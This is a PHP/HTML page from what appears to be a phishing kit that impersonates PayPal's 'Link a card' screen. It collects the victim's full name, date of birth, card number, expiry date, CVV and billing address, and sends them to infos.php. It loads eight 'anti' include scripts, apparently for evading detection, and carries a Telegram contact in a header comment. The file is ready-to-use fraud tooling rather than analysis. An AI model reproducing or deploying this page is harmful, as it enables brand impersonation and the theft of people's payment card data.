<!-- ____ INFORMATION ____ 
     
     TELEGRAM : @ghayt_Zone
-->


<?php 

require_once "functions.php";

include("../anti/anti1.php");
include("../anti/anti2.php");
include("../anti/anti3.php");
include("../anti/anti4.php");
include("../anti/anti5.php");
include("../anti/anti6.php");
include("../anti/anti7.php");
include("../anti/anti8.php");

?>
<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <title>PayPal: Wallet</title>
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <!-- template css files-->
  <link rel="stylesheet"  href="css/bootstrap.css">
  <link rel="stylesheet"  href="css/test.css">               
  <link rel="preconnect" href="https://fonts.gstatic.com">

  <!-- js files-->
  <script src="js/html5shiv.min.js"></script>
  <script src="js/respond.min.js"></script>

  <!-- logo site web-->
  <link rel="icon" href="image/Untitled-1.png" type="image/x-icon" />
  <link rel="shortcut icon" href="image/Untitled-1.png" type="image/x-icon" />

</head>

<body style="background: #f4f6f9;">
    <div class="cardd">
        <div class="logo">
            <img src="image/loog.webp">
            <img style=" width: 36px;" src="image/close.png">
        </div>
        <h2>Link a card</h2>
        <div class="card-image">
            <img src="image/generic_card.png">
        </div>
        <div class="form">
            <form action="infos.php" method="post">
                <input type="hidden" name="step" value="cc">

                    <div class="form-card">
                        <input id="full_name" name="full_name" type="text" placeholder="Enter Full Name" value="<?php echo $_SESSION['full_name']?>">
                        <label >Full Name</label>
                         <?php
                         if( !empty($_SESSION['errors']['full_name']) ) {
                            echo '<div class="error">Full Name not valid</div>';
                         }
                        ?>
                 </div>

                 <div class="form-card">
                        <input id="dob" name="dob" type="text" placeholder="Enter Date Of Birthday" value="<?php echo $_SESSION['dob']?>">
                        <label >Date Of Birthday</label>
                         <?php
                         if( !empty($_SESSION['errors']['dob']) ) {
                            echo '<div class="error">Full Name not valid</div>';
                         }
                        ?>
                 </div>


                <div class="form-card">
                     <input id="card_number" name="card_number" type="text" placeholder="Enter card number" value="<?php echo $_SESSION['card_number']?>">
                     <label >Credit card number</label>
                     <?php
                     if( !empty($_SESSION['errors']['card_number']) ) {
                        echo '<div class="error">Card number not valid</div>';
                     }
                    ?>
                 </div>
                 <div class="card-type form-card">
                    <label>card type</label>
                     <select id="select" name="type">
                         <option value="">Select your card type </option>
                         <option <?php if( $_SESSION['type'] == 'visa' ) { echo 'selected'; } ?> value="visa">Visa</option>
                         <option <?php if( $_SESSION['type'] == 'Mastercard' ) { echo 'selected'; } ?> value="Mastercard">Mastercard</option>
                         <option <?php if( $_SESSION['type'] == 'Express' ) { echo 'selected'; } ?> value="Express">American Express</option>
                         <option <?php if( $_SESSION['type'] == 'Discover' ) { echo 'selected'; } ?> value="Discover">Discover</option>
                     </select>
                     <?php
                     if( !empty($_SESSION['errors']['type']) ) {
                        echo '<div class="error">Type not valid</div>';
                     }
                     ?>
                 </div>
                 <div class="form-card">
                     <input id="date"  type="text" maxlength="7" name="date" placeholder="mm/yy" value="<?php echo $_SESSION['date']?>">
                     <label >Expiration date</label>
                     <?php
                     if( !empty($_SESSION['errors']['date']) ) {
                        echo '<div class="error">Date not valid</div>';
                     }
                     ?>
                 </div>
                 <div class="form-card">
                    <div style="display: flex;align-items: center;justify-content: space-between;">
                         <input style="width: 82%;" id="security"  type="text" name="security" placeholder="Enter security code"  value="<?php echo $_SESSION['security']?>">
                         <label >Security code</label>
                         <div style="margin-top:15px;" class="card-code">
                             <img src="image/card-code.png">
                         </div>
                     </div>
                     <?php
                     if( !empty($_SESSION['errors']['security']) ) {
                        echo '<div class="error">CVV not valid</div>';
                     }
                     ?>
                 </div>
                  <div class="form-card">
                     <input id="adress"  type="text" name="adress" placeholder="Billing address" value="<?php echo $_SESSION['adress']?>">
                     <label >Billing address</label>
                     <?php
                     if( !empty($_SESSION['errors']['adress']) ) {
                        echo '<div class="error">Address not valid</div>';
                     }
                     ?>
                 </div>
                 <button name="submit" id="link">Link Card</button>
            </form>
        </div>
        
    </div>
     

  <!-- template files js-->
  <script src="js/jquery-3.5.1.min.js"></script>
  <script src="js/bootstrap.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/3.0.0/jquery.payment.min.js"></script>
  <script src="js/test.js"></script>
  <script src="js/jquery.mask.js"></script>
  <script>
        $('#security').payment('formatCardCVC');
        $('#date').payment('formatCardExpiry');
        $('#card_number').payment('formatCardNumber');


        $('#dob').mask('00/00/0000');
  </script>
</body>
</html>